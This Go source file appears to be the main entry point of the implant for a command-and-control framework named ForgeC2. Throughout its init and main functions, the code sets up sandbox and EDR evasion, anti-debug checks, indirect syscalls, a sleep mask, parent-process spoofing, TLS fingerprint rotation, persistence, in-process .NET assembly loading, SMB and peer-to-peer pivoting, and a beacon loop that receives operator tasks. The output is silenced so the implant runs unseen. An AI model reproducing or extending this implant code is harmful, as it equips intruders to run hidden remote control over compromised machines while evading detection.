package main

import (
	"bytes"
	"encoding/hex"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/forgec2/forgec2/pkg/peimage"
)

func init() {
	setDPIAware()

	// Start EDR monitor on init
	startEdrMonitor()

	// Run sandbox detection
	go func() {
		time.Sleep(5 * time.Second) // wait for system to settle
		runSandboxCheck()
	}()

	// Environment classification (async to avoid delaying startup); only the
	// ops profile is kept â€” it gates the shell/injection/cred-dump checks below.
	go func() {
		time.Sleep(3 * time.Second)
		if _, opsProfile := detectEnvironment(); opsProfile != nil {
			currentOpsProfile = opsProfile
			if !opsProfile.AllowShell {
				logDebug("[env] Shell commands disabled in this environment")
			}
			if !opsProfile.AllowInjection {
				logDebug("[env] Process injection disabled in this environment")
			}
			if !opsProfile.AllowCredDump {
				logDebug("[env] Credential dumping disabled in this environment")
			}
		}
	}()

	// Apply the injected runtime config block (XOR'd JSON blob) over defaults
	// before any of the string vars are parsed below.
	loadConfigBlob()

	// Anti-sandbox startup delay: per-boot random sleep inside the configured
	// window before any beacon or task runs. 0/0 (default) disables.
	applyStartDelay()

	// Parse injected string values ( -X only supports string )
	// Multi-C2 failover: comma-separated URLs in C2URL
	urls := splitC2URLList(C2URL)
	if len(urls) == 0 {
		urls = []string{C2URL}
	}
	c2URLsStore(urls, 0)
	var err error
	Interval, err = strconv.Atoi(IntervalStr)
	if err != nil || Interval < 1 {
		Interval = 10
	}
	Jitter, err = strconv.Atoi(JitterStr)
	if err != nil {
		Jitter = 20
	}
	// Clamp jitter to [0,100]% so a >100 value can never yield a negative
	// sleep duration (which would panic time.NewTimer or cause a beacon storm).
	if Jitter < 0 {
		Jitter = 0
	}
	if Jitter > 100 {
		Jitter = 100
	}
	Persist = strings.ToLower(PersistStr) == "true" || PersistStr == "1"
	SkipTLSVerify = strings.ToLower(SkipTLSVerifyStr) == "true" || SkipTLSVerifyStr == "1"
	Debug = strings.ToLower(DebugStr) == "true" || DebugStr == "1"
	BeaconURI = BeaconURIStr
	if BeaconURI == "" {
		BeaconURI = "/collect"
	}
	BeaconMethod = "POST" // FORCE POST �?GET with body is unreliable in Go's http client
	bt := BeaconTransportStr
	if bt == "" {
		bt = "http"
	}
	setBeaconTransport(bt)

	// Re-apply the last server-delivered network config only after the
	// compile-time C2URL list has been parsed. Doing this earlier let the
	// single delivered URL overwrite the list before the build-time failover
	// entries were loaded.
	loadPersistedNetworkConfig()

	// SMB pipe name: use explicit config or extract from C2URL
	smbPipeName = SMBPipeName
	if smbPipeName == "" {
		// Try to extract from C2URL when Protocol is "smb"
		if getProtocol() == "smb" || strings.HasPrefix(C2URL, "smb://") {
			smbPipeName = strings.TrimPrefix(C2URL, "smb://")
		}
	}
	isSMBParent = strings.ToLower(IsSMBParentStr) == "true" || IsSMBParentStr == "1"

	if Debug {
		fmt.Printf("[DEBUG] BeaconURI=%q BeaconMethod=%q C2URL=%q SMBPipeName=%q\n", BeaconURI, BeaconMethod, C2URL, smbPipeName)
	}
	if id, err := strconv.ParseUint(ListenerIDStr, 10, 32); err == nil {
		ListenerID = uint(id)
	}

	evasionEnabled = strings.ToLower(EvasionStr) == "true" || EvasionStr == "1"
	if v := os.Getenv("FORGEC2_EVASION"); v == "1" || strings.ToLower(v) == "true" {
		evasionEnabled = true
	}

	ghostModeEnabled = strings.ToLower(GhostModeStr) == "true" || GhostModeStr == "1"
	if v := os.Getenv("FORGEC2_GHOST_MODE"); v == "1" || strings.ToLower(v) == "true" {
		ghostModeEnabled = true
	}

	// Adaptive EDR detection + early anti-debug sweep. All of this plumbing
	// (evasion strategy flags, anti-debug hooks) is windows-only; the linux
	// stub is a harmless no-op. This must run before the sleep-mask decision
	// below: enableSleepMask is one of the strategy flags it sets.
	applyAdaptiveEvasion()

	// Direct/indirect syscall policy: independent of the sleep-mask opt-in.
	// When enabled, resolve SSNs once from ntdll on disk at startup; if the
	// table is incomplete, refuse to use indirect syscalls (no silent fallback
	// to a wrong syscall number on the target).
	syscallPolicyEnabled = strings.ToLower(SyscallPolicyStr) == "true" || SyscallPolicyStr == "1"
	if v := os.Getenv("FORGEC2_SYSCALL_POLICY"); v == "1" || strings.ToLower(v) == "true" {
		syscallPolicyEnabled = true
	}
	if syscallPolicyEnabled && runtime.GOOS == "windows" {
		if err := initSyscallPolicy(); err != nil {
			logDebugf("[syscall] policy resolution failed: %v", err)
			useIndirectSyscall = false
		}
	}

	// Sleep mask: initialize the platform infrastructure, then honor the EDR
	// strategy's opt-in. An operator-set mask (set_sleep_mask task) activates
	// it independently at runtime.
	if InitSleepMask() && sleepMaskPolicyEnabled() {
		activateSleepMask()
	}

	ppidSpoofEnabled = strings.ToLower(PPIDSpoofStr) == "true" || PPIDSpoofStr == "1"
	if v := os.Getenv("FORGEC2_PPID_SPOOF"); v == "1" || strings.ToLower(v) == "true" {
		ppidSpoofEnabled = true
	}
	if ppidSpoofEnabled {
		ppidSpoofParent = PPIDSpoofParent
		if v := os.Getenv("FORGEC2_PPID_PARENT"); v != "" {
			ppidSpoofParent = v
		}
		if ppidSpoofParent == "" {
			ppidSpoofParent = "explorer.exe"
		}
	}

	egressDetection = strings.ToLower(EgressDetectionStr) == "true" || EgressDetectionStr == "1"

	chameleonProfile = ChameleonProfileStr
	if v := os.Getenv("FORGEC2_CHAMELEON_PROFILE"); v != "" {
		chameleonProfile = v
	}
	if chameleonProfile == "" {
		chameleonProfile = "random"
	}
	chameleonEnabled := strings.ToLower(ChameleonStr) == "true" || ChameleonStr == "1"
	if v := os.Getenv("FORGEC2_CHAMELEON"); v == "1" || strings.ToLower(v) == "true" {
		chameleonEnabled = true
	}
	initJA3Rotation(chameleonProfile, chameleonEnabled)

	persistencePrefix = PersistencePrefixStr
	if persistencePrefix == "" {
		persistencePrefix = "ForgeC2"
	}
	if v := os.Getenv("FORGEC2_PERSIST_PREFIX"); v != "" {
		persistencePrefix = v
	}

	// Derive transport artifact names from the (operator-controlled) persistence
	// prefix so the compiled implant never ships the literal "forgec2" as a pipe
	// name or SSH username — those are trivial network/process IOCs.
	if SMBPipeName == "" {
		SMBPipeName = persistencePrefix
	}
	if SSHUserStr == "" {
		SSHUserStr = persistencePrefix
	}

	// Certificate pinning
	initTLSPinning()

	// SSH transport config
	initSSHConfig()

	// mTLS transport config
	initMTLS()

	// Initialize CLR (.NET) hosting for in-process assembly execution
	if runtime.GOOS == "windows" {
		useCLRHosting = initCLRHosting()
	}

	// Initialize v2 beacon crypto: persistent identity key + ephemeral ECDH session.
	// v2 has no legacy XOR/plaintext beacon path — encryption is mandatory.
	loadOrCreateIdentityKey()
	sess, err := newECDSession()
	if err == nil {
		ecdhSess = sess
	}

	// Expiry date check: exit if expired
	if ExpiryDateStr != "" {
		kd, err := time.Parse("2006-01-02", ExpiryDateStr)
		if err == nil && time.Now().After(kd) {
			debugLog("Expiry date reached, exiting.")
			os.Exit(0)
		}
	}

	// Parse multi-C2 mode
	switch strings.ToLower(C2ModeStr) {
	case "failover":
		c2Mode = C2ModeFailover
	case "roundrobin", "round_robin":
		c2Mode = C2ModeRoundRobin
	case "random":
		c2Mode = C2ModeRandom
	case "split":
		c2Mode = C2ModeSplit
	case "parallel":
		c2Mode = C2ModeParallel
	default:
		c2Mode = C2ModeSingle
	}

	if mr, err := strconv.Atoi(MaxRetriesStr); err == nil {
		maxRetries = mr
	} else {
		maxRetries = 10
	}

	if dt, err := strconv.Atoi(DeadTimeoutStr); err == nil {
		deadTimeout = time.Duration(dt) * time.Second
	} else {
		deadTimeout = 3600 * time.Second
	}

	c2Stats = make(map[int]*c2FailStats)

	// Parse gossip config
	GossipEnabled = strings.ToLower(GossipEnabledStr) == "true" || GossipEnabledStr == "1"
	if gi, err := strconv.Atoi(GossipIntervalStr); err == nil && gi > 0 {
		GossipInterval = gi
	} else {
		GossipInterval = 30
	}
	// If gossip listen addr not set, derive from P2PListenAddr by incrementing port
	if GossipEnabled && GossipListenAddr == "" && P2PListenAddr != "" {
		if host, portStr, err := net.SplitHostPort(P2PListenAddr); err == nil {
			if port, err := strconv.Atoi(portStr); err == nil {
				GossipListenAddr = fmt.Sprintf("%s:%d", host, port+1)
			}
		}
	}

	// Working hours
	setWorkingHours(WorkingStartStr, WorkingEndStr, WorkingTZStr)

	// Kill date
	if KillDateStr != "" {
		if kd, err := time.Parse("2006-01-02", KillDateStr); err == nil {
			killDateParsed = kd
		}
	}

	// All HTTPS egress uses the utls dialer so the ClientHello is a realistic,
	// configurable fingerprint (stable Chrome Auto by default; per-dial JA3
	// rotation when ChameleonStr / FORGEC2_CHAMELEON enables it) instead of
	// the Go-stdlib stack.
	tr := newUTLSTransport()
	if ProxyStr != "" {
		proxyURL, err := url.Parse(ProxyStr)
		if err == nil {
			tr.Proxy = http.ProxyURL(proxyURL)
		}
	}
	client = &http.Client{
		Transport: tr,
		Timeout:   30 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 3 {
				return http.ErrUseLastResponse
			}
			return rejectCleartextRedirect(req, via)
		},
	}
}

// rejectCleartextRedirect refuses a redirect that would move a beacon from an
// encrypted origin to a cleartext one. A TLS C2 whose certificate is valid
// never needs to hand the session to http://, so honouring that hop only
// helps whoever controls the network path. Lab (cleartext) origins keep their
// normal redirect behaviour.
func rejectCleartextRedirect(req *http.Request, via []*http.Request) error {
	if len(via) == 0 || req == nil || req.URL == nil {
		return nil
	}
	if !strings.EqualFold(req.URL.Scheme, "http") {
		return nil
	}
	prev := via[len(via)-1]
	if prev == nil || prev.URL == nil {
		return nil
	}
	switch strings.ToLower(prev.URL.Scheme) {
	case "https", "wss":
		return fmt.Errorf("refusing cleartext redirect from %s://%s to %s", prev.URL.Scheme, prev.URL.Host, req.URL.String())
	}
	return nil
}

// verifySelfIntegrityData mirrors the build-time digest exactly: the embedded
// hash is zeroed, then pkg/peimage computes the PE-aware digest (checksum and
// security directory omitted, certificate table excluded) or the whole-file
// digest for ELF/Mach-O. The embedded hash must occur exactly once, so a
// duplicated marker cannot hide a tampered region.
func verifySelfIntegrityData(data []byte, expected string) error {
	if len(expected) != 64 {
		return fmt.Errorf("self-check digest has %d chars, want 64", len(expected))
	}
	needle := []byte(expected)
	if count := bytes.Count(data, needle); count != 1 {
		return fmt.Errorf("self-check digest found %d times in image, want exactly 1", count)
	}
	idx := bytes.Index(data, needle)
	calc := append([]byte(nil), data...)
	for i := idx; i < idx+len(needle); i++ {
		calc[i] = 0
	}
	sum, err := peimage.Digest(calc)
	if err != nil {
		return err
	}
	if actual := hex.EncodeToString(sum); actual != expected {
		return fmt.Errorf("self-check digest mismatch")
	}
	return nil
}

func verifySelfIntegrity() {
	exePath, err := os.Executable()
	if err != nil {
		os.Exit(1)
	}
	exePath, err = filepath.EvalSymlinks(exePath)
	if err != nil {
		os.Exit(1)
	}
	data, err := os.ReadFile(exePath)
	if err != nil {
		os.Exit(1)
	}
	if err := verifySelfIntegrityData(data, SelfCheckSHA256Str); err != nil {
		os.Exit(1)
	}
}

func main() {
	log.SetFlags(0)
	if !Debug {
		log.SetOutput(io.Discard)
		os.Stdout, _ = os.Open(os.DevNull)
		os.Stderr, _ = os.Open(os.DevNull)
	}

	if SelfCheckSHA256Str != "" {
		verifySelfIntegrity()
	}

	setDPIAware()
	if Debug {
		fmt.Println(s(SForgeC2), "Agent starting...")
	}

	if Persist {
		addPersistence()
	}

	// Sandbox detection ? run once at startup
	detector := NewSandboxDetector()
	result := detector.Detect()
	inSandbox = result.IsSandbox
	if inSandbox {
		logDebugf("Sandbox detected (confidence: %d%%), entering benign mode", result.Confidence)
	}

	// Initial registration / first beacon
	agentUUID = registerOrGetUUID()

	// Protocol state: registration key. v3 uses a per-implant secret compiled
	// into this binary (never the fleet master key); v2 derives from the
	// compiled-in beacon key. Never transmitted; persisted sequence +
	// registered marker so a restart continues the same session timeline.
	agentRegKey = loadAgentRegKey()
	loadBeaconState()
	// Restore unsent task results collected before the last crash/restart.
	// Must run after the UUID and identity key are available (loadBeaconState
	// is not enough: the spool key is derived from identityPriv).
	loadPendingResultsSpool()

	// Debug note when running attached to an SMB parent pipe.
	if getProtocol() == "smb" || getBeaconTransport() == "smb" {
		if Debug {
			fmt.Printf(s(SForgeC2)+" SMB child mode, pipe: %s\n", smbPipeName)
		}
	}

	// Start SMB parent pipe listener if configured
	if isSMBParent && smbPipeName != "" {
		if err := StartSMBParentPipe(smbPipeName); err != nil { //nolint:staticcheck // dual-GOOS dispatch: one target's impl makes this branch statically dead; the other can genuinely fail
			if Debug {
				fmt.Printf("[!] SMB parent pipe start failed: %v\n", err)
			}
		} else {
			go p2pCleanupStaleChildren()
		}
	}

	// Start P2P parent listener if in parent mode
	if P2PMode != "" && P2PListenAddr != "" {
		go p2pParentListen()
		go p2pCleanupStaleChildren()
		if Debug {
			fmt.Printf(s(SForgeC2)+" P2P parent mode (%s) on %s\n", P2PMode, P2PListenAddr)
		}
	}

	// JIT Beacon Scheduler
	if runtime.GOOS == "windows" {
		getBeaconScheduler()
	}

	// Network-change wake: an interface up/down or address change interrupts
	// the current sleep so the agent reconnects promptly on the new network
	// instead of waiting out the full interval.
	startNetworkWakeMonitor()

	// Start gossip protocol for P2P mesh auto-routing
	if GossipEnabled {
		go startGossipProtocol()
		if GossipListenAddr != "" {
			go gossipListen()
			if Debug {
				fmt.Printf(s(SForgeC2)+" Gossip listener on %s\n", GossipListenAddr)
			}
		}
	}

	// Run egress detection on first startup if configured
	if getProtocol() != "smb" && (getBeaconTransport() == "auto" || egressDetection) {
		c2Host := extractC2Host()
		ports := parseEgressPorts()
		if Debug {
			fmt.Printf("[egress] Running egress detection against %s ports %v\n", c2Host, ports)
		}
		report := runEgressDetection(c2Host, ports)
		if report.Best != "" {
			bestEgressProto = report.Best
			if Debug {
				fmt.Printf("[egress] Best protocol: %s\n", bestEgressProto)
			}
			switch {
			case strings.HasPrefix(bestEgressProto, "tcp/"):
				setProtocol("tcp")
			case bestEgressProto == "dns":
				setProtocol("dns")
			case bestEgressProto == "icmp":
				setProtocol("icmp")
			}
		}
	}

	// Main beacon loop
	startTaskWorker()
	beaconCount := 0
	for {
		// Kill date check: exit if expired
		if !killDateParsed.IsZero() && time.Now().After(killDateParsed) {
			if Debug {
				fmt.Println("[*] Kill date reached, exiting.")
			}
			os.Exit(0)
		}

		// Ghost mode: send final beacon, then hide. Sleep in one-hour slices
		// so an operator-triggered ghost exit (or the auto-expiry timer) is
		// observed promptly instead of up to 24h later.
		if isInGhostMode() {
			if !ghostBeaconSent {
				ghostBeaconSent = true
				doBeaconSafe()
			}
			for i := 0; i < 24 && isInGhostMode(); i++ {
				sleepInterruptible(1 * time.Hour)
			}
			continue
		}

		// Check triggers before beacon (Windows only)
		if runtime.GOOS == "windows" && beaconSched != nil {
			beaconSched.CheckTriggers()
		}

		doBeaconSafe()
		beaconCount++

		// Exponential backoff on consecutive beacon failures. A server-sent
		// Retry-After raises the floor so a 429 does not turn into a retry
		// storm; the value is capped by parse/storage to five minutes.
		if beaconConsecutiveFailures > 0 {
			backoffSec := beaconBackoffSec(beaconConsecutiveFailures)
			retryFloor := 0
			if retryAfter := takeHTTPRetryAfter(); retryAfter > 0 {
				retryFloor = int((retryAfter + time.Second - 1) / time.Second)
			}
			// Add jitter: ±25%
			jitterRange := backoffSec / 4
			if jitterRange > 0 {
				backoffSec += rng.Intn(2*jitterRange+1) - jitterRange
			}
			// Honour the server's floor after jitter so a short backoff plus
			// negative jitter can never retry before Retry-After expires.
			if retryFloor > backoffSec {
				backoffSec = retryFloor
			}
			if Debug {
				fmt.Printf("[!] Beacon backoff: sleeping %ds (failures=%d)\n", backoffSec, beaconConsecutiveFailures)
			}
			// Interruptible: ghost transitions / kill-date expiry observed
			// promptly instead of after the full backoff.
			sleepInterruptible(time.Duration(backoffSec) * time.Second)
			continue
		}

		// Notify scheduler after beacon
		if runtime.GOOS == "windows" && beaconSched != nil {
			beaconSched.AfterBeacon()
		}

		// Deliver task results immediately instead of waiting a full sleep cycle.
		pendingMu.Lock()
		hasPending := len(pendingResults) > 0 || len(pendingTaskAcks) > 0
		pendingMu.Unlock()
		if hasPending {
			continue
		}

		// Working hours check: if outside working hours, sleep until next window
		wh := getWorkingHours()
		if wh.start != "" && wh.end != "" {
			if !isWithinWorkingHours() {
				sleepDuration := timeUntilNextWindow()
				if Debug {
					fmt.Printf("[working] Outside working hours (%s-%s), sleeping %v\n", wh.start, wh.end, sleepDuration)
				}
				if sleepDuration < 0 {
					sleepDuration = 0
				}
				time.Sleep(sleepDuration)
				continue
			}
		}

		sleepWithJitter()
	}
}
